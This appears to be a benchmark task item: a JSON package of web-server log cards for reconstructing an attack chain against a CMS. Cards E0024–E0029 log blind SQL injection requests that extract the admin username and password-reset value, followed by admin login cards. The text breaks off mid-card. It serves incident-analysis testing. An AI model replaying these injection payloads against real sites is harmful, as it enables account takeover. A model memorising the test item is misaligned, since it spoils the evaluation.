@@ -1,0 +1,3276 @@
+{
+  "incident_id": "case_A",
+  "task_type": "evidence_grounded_attack_chain_reconstruction",
+  "task_instruction": "Reconstruct a structured, temporally ordered, evidence-supported attack chain. Select supporting evidence IDs from evidence_cards. Do not invent facts that are not supported.",
+  "incident_brief": "A web application incident contains repeated admin activity and unusual application, network, and system-call observations. Use only the provided log observation cards to reconstruct what the attacker did, in order, and cite evidence for each step.",
+  "required_output": {
+    "incident_summary": "short free-text summary",
+    "attack_chain": [
+      {
+        "step_id": "S1",
+        "order": 1,
+        "attack_step": "short step title",
+        "step_description": "what happened and why it matters",
+        "tactic": "MITRE ATT&CK tactic",
+        "technique_id": "MITRE ATT&CK technique ID",
+        "technique_name": "MITRE ATT&CK technique name",
+        "entities": {
+          "files": [],
+          "processes": [],
+          "hosts": [],
+          "urls": [],
+          "accounts": []
+        },
+        "supporting_evidence": [
+          "EVIDENCE_ID"
+        ],
+        "confidence": "low|medium|high"
+      }
+    ],
+    "causal_edges": [
+      {
+        "source": "S1",
+        "target": "S2",
+        "relation": "temporal_after|enables|uses_output_of|same_session_sequence",
+        "supporting_evidence": [
+          "EVIDENCE_ID"
+        ]
+      }
+    ]
+  },
+  "evidence_cards": [
+    {
+      "evidence_id": "E0001",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:29:24 +0000] \"GET /index.php?page=where-do-i-get-help HTTP/1.1\" 200 3625 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 66,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025",
+          "/index.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:29:24",
+          "/index.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0002",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:29:32 +0000] \"GET / HTTP/1.1\" 200 5202 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 77,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:29:32"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0003",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "127.0.0.1 - - [10/Jan/2025:19:29:38 +0000] \"GET / HTTP/1.1\" 200 19514 \"-\" \"curl/7.64.0\"",
+      "line": 81,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/7.64.0",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/7.64.0",
+          "/Jan/2025:19:29:38"
+        ],
+        "ips": [
+          "127.0.0.1"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0004",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:29:47 +0000] \"GET /index.php?page=how-cmsms-works HTTP/1.1\" 200 3494 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 88,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025",
+          "/index.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:29:47",
+          "/index.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0005",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:31:12 +0000] \"GET / HTTP/1.1\" 200 5201 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 157,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:31:12"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0006",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:31:16 +0000] \"GET / HTTP/1.1\" 200 5201 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 160,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:31:16"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0007",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:31:23 +0000] \"GET / HTTP/1.1\" 200 5202 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 166,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:31:23"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0008",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:31:26 +0000] \"GET / HTTP/1.1\" 200 5202 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 170,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:31:26"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0009",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "127.0.0.1 - - [10/Jan/2025:19:31:30 +0000] \"GET / HTTP/1.1\" 200 19514 \"-\" \"curl/7.64.0\"",
+      "line": 173,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/7.64.0",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/7.64.0",
+          "/Jan/2025:19:31:30"
+        ],
+        "ips": [
+          "127.0.0.1"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0010",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:31:56 +0000] \"GET /index.php?page=how-cmsms-works HTTP/1.1\" 200 3494 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 195,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025",
+          "/index.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:31:56",
+          "/index.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0011",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:32:32 +0000] \"GET / HTTP/1.1\" 200 5202 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 224,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:32:32"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0012",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:32:40 +0000] \"GET / HTTP/1.1\" 200 5202 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 233,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:32:40"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0013",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:33:43 +0000] \"GET /index.php?page=menu-manager HTTP/1.1\" 200 3633 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 293,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025",
+          "/index.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:33:43",
+          "/index.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0014",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:33:53 +0000] \"GET /index.php?page=default_templates HTTP/1.1\" 200 3877 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 301,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025",
+          "/index.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:33:53",
+          "/index.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0015",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "127.0.0.1 - - [10/Jan/2025:19:34:02 +0000] \"GET / HTTP/1.1\" 200 19514 \"-\" \"curl/7.64.0\"",
+      "line": 309,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/7.64.0",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/7.64.0",
+          "/Jan/2025:19:34:02"
+        ],
+        "ips": [
+          "127.0.0.1"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0016",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:35:16 +0000] \"GET /index.php?page=how-cmsms-works HTTP/1.1\" 200 3494 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 372,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025",
+          "/index.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:35:16",
+          "/index.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0017",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:35:23 +0000] \"GET / HTTP/1.1\" 200 5202 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 378,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:35:23"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0018",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:35:38 +0000] \"GET / HTTP/1.1\" 200 5201 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 390,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:35:38"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0019",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "127.0.0.1 - - [10/Jan/2025:19:35:44 +0000] \"GET / HTTP/1.1\" 200 19514 \"-\" \"curl/7.64.0\"",
+      "line": 395,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/7.64.0",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/7.64.0",
+          "/Jan/2025:19:35:44"
+        ],
+        "ips": [
+          "127.0.0.1"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0020",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:36:22 +0000] \"GET / HTTP/1.1\" 200 5202 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 426,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:36:22"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0021",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:37:00 +0000] \"GET /index.php?page=menu-manager HTTP/1.1\" 200 3633 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 457,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025",
+          "/index.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:37:00",
+          "/index.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0022",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:37:10 +0000] \"GET / HTTP/1.1\" 200 5202 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 467,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:37:10"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0023",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:37:11 +0000] \"GET /index.php?page=how-cmsms-works HTTP/1.1\" 200 3494 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 468,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025",
+          "/index.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:37:11",
+          "/index.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0024",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:38:12 +0000] \"GET /moduleinterface.php?mact=News%2Cm1_%2Cdefault%2C0&m1_idlist=%2C1%29%29+and+1%3D1--+ HTTP/1.1\" 200 4714 \"-\" \"python-requests/2.32.3\"",
+      "line": 517,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025",
+          "/moduleinterface.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025:19:38:12",
+          "/moduleinterface.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0025",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:38:12 +0000] \"GET /moduleinterface.php?mact=News%2Cm1_%2Cdefault%2C0&m1_idlist=%2C1%29%29+and+1%3D2--+ HTTP/1.1\" 200 4614 \"-\" \"python-requests/2.32.3\"",
+      "line": 518,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025",
+          "/moduleinterface.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025:19:38:12",
+          "/moduleinterface.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0026",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:38:12 +0000] \"GET /moduleinterface.php?mact=News%2Cm1_%2Cdefault%2C0&m1_idlist=%2C1%29%29+and+%2C1%29%29+and+ascii%28substr%28%28select+username+from+cms_users+where+user_id%3D1%29+from+1+for+1%29%29%3D48--+--+ HTTP/1.1\" 200 4671 \"-\" \"python-requests/2.32.3\"",
+      "line": 520,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025",
+          "/moduleinterface.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025:19:38:12",
+          "/moduleinterface.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0027",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:38:12 +0000] \"GET /moduleinterface.php?mact=News%2Cm1_%2Cdefault%2C0&m1_idlist=%2C1%29%29+and+%2C1%29%29+and+ascii%28substr%28%28select+username+from+cms_users+where+user_id%3D1%29+from+1+for+1%29%29%3D49--+--+ HTTP/1.1\" 200 4671 \"-\" \"python-requests/2.32.3\"",
+      "line": 521,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025",
+          "/moduleinterface.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025:19:38:12",
+          "/moduleinterface.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0028",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:38:48 +0000] \"GET /moduleinterface.php?mact=News%2Cm1_%2Cdefault%2C0&m1_idlist=%2C1%29%29+and+%2C1%29%29+and+ascii%28substr%28%28select+value+from+cms_userprefs+where+preference%3D0x70777265736574+and+user_id%3D1%29+from+1+for+1%29%29%3D48--+--+ HTTP/1.1\" 200 4699 \"-\" \"python-requests/2.32.3\"",
+      "line": 820,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025",
+          "/moduleinterface.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025:19:38:48",
+          "/moduleinterface.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0029",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:38:48 +0000] \"GET /moduleinterface.php?mact=News%2Cm1_%2Cdefault%2C0&m1_idlist=%2C1%29%29+and+%2C1%29%29+and+ascii%28substr%28%28select+value+from+cms_userprefs+where+preference%3D0x70777265736574+and+user_id%3D1%29+from+1+for+1%29%29%3D49--+--+ HTTP/1.1\" 200 4699 \"-\" \"python-requests/2.32.3\"",
+      "line": 821,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025",
+          "/moduleinterface.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025:19:38:48",
+          "/moduleinterface.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0030",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:39:54 +0000] \"POST /admin/login.php HTTP/1.1\" 302 1270 \"-\" \"python-requests/2.32.3\"",
+      "line": 1184,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025",
+          "/admin/login.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025:19:39:54",
+          "/admin/login.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "python"
+        ],
+        "accounts": [
+          "admin"
+        ],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0031",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:39:55 +0000] \"POST /admin/login.php HTTP/1.1\" 302 1193 \"-\" \"python-requests/2.32.3\"",
+      "line": 1189,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025",
+          "/admin/login.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025:19:39:55",
+          "/admin/login.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "python"
+        ],
+        "accounts": [
+          "admin"
+        ],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0032",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:39:55 +0000] \"GET /admin?__c=30cea8cdf32246dcafa HTTP/1.1\" 301 625 \"-\" \"python-requests/2.32.3\"",
+      "line": 1190,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025",
+          "/admin"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025:19:39:55",
+          "/admin"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "python"
+        ],
+        "accounts": [
+          "admin"
+        ],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0033",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:39:55 +0000] \"GET /admin/?__c=30cea8cdf32246dcafa HTTP/1.1\" 200 5101 \"-\" \"python-requests/2.32.3\"",
+      "line": 1191,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025",
+          "/admin/"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025:19:39:55",
+          "/admin/"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "python"
+        ],
